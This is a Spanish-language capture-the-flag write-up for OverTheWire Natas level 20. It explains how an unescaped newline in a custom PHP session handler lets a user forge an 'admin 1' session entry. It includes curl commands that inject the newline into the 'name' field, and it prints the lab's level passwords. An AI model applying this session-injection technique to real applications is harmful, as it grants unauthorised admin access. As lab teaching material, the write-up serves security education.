# Natas Level20

## Descripción
> **Level Goal (natas20.natas.labs.overthewire.org):** Un formulario permite cambiar "tu nombre" (`$_SESSION["name"] = $_REQUEST["name"]`), y de nuevo solo un `$_SESSION["admin"] == 1` desbloquea las credenciales. Esta vez la app implementa su **propio manejador de sesiones** (`session_set_save_handler`) con formato de almacenamiento casero: cada variable de sesión se guarda como una línea de texto `clave valor`, separadas por `\n`, en un archivo `mysess_<sid>`.

## Solución
El manejador de escritura (`mywrite`) vuelca cada par clave/valor de `$_SESSION` como `"$key $value\n"` **sin escapar ni validar el contenido del valor**. Si el valor de `name` contiene un salto de línea, ese salto de línea queda embebido literalmente en el archivo, creando una línea adicional que el manejador de lectura (`myread`) interpretará, en la siguiente petición, como un par clave/valor completamente nuevo — incluyendo, por ejemplo, `admin 1`.

Es una inyección de datos de sesión: al no delimitar los registros de forma segura (sin escapar `\n` ni el separador `key value`), cualquier variable de sesión controlada por el usuario permite fabricar variables de sesión arbitrarias.

```bash
# 1) Primera petición: fijamos name con un salto de línea real seguido de "admin 1"
curl -s -c cookies.jar -u natas20:slOKYGsjlJhaqKliGvrgWAzln0JyrWao \
  --data-urlencode $'name=x\nadmin 1' \
  http://natas20.natas.labs.overthewire.org/index.php -o /dev/null
# Esto queda guardado en el archivo de sesión como dos líneas:
#   name x
#   admin 1

# 2) Segunda petición con la misma cookie: my_read() reparsea el archivo
#    ANTES de llamar a print_credentials(), así que ahora sí ve $_SESSION["admin"]="1"
curl -s -b cookies.jar -u natas20:slOKYGsjlJhaqKliGvrgWAzln0JyrWao \
  http://natas20.natas.labs.overthewire.org/index.php
# You are an admin. The credentials for the next level are:
# Username: natas21
# Password: 7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU
```

## Notas adicionales
- Hacen falta **dos peticiones**, no una: en la primera, `$_SESSION` se modifica en memoria y `print_credentials()` se ejecuta *antes* de que PHP escriba (`mywrite`) el archivo de sesión al final del script — así que la respuesta de esa primera petición todavía no muestra "admin". Solo en la petición siguiente, `myread()` vuelve a parsear el archivo (ya "envenenado") al principio del script, antes de `print_credentials()`.
- Este patrón — implementar un formato de serialización propio "más simple" que el de PHP y terminar reintroduciendo una vulnerabilidad de inyección — es un ejemplo clásico de por qué no conviene reinventar mecanismos de serialización/session handling ya resueltos por el lenguaje o el framework, y por qué cualquier delimitador de registro (aquí, `\n` y el primer espacio) debe validarse o escaparse si el contenido puede ser arbitrario.

## Referencias
- Reto original: http://natas20.natas.labs.overthewire.org/
- Apoyo: https://www.php.net/manual/en/function.session-set-save-handler.php (manual de PHP sobre manejadores de sesión personalizados)
